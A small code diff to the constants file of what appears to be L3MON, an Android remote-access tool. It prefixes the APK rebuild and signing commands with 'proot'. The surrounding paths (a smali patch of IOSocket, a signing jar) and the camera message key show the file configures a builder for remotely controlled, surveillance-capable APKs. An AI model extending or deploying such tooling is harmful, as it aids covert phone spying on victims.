@@ -17,8 +17,8 @@ exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
 exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
 exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');
 
-exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
-exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output
+exports.buildCommand = 'proot java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
+exports.signCommand = 'proot java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output
 
 exports.messageKeys = {
     camera: '0xCA',
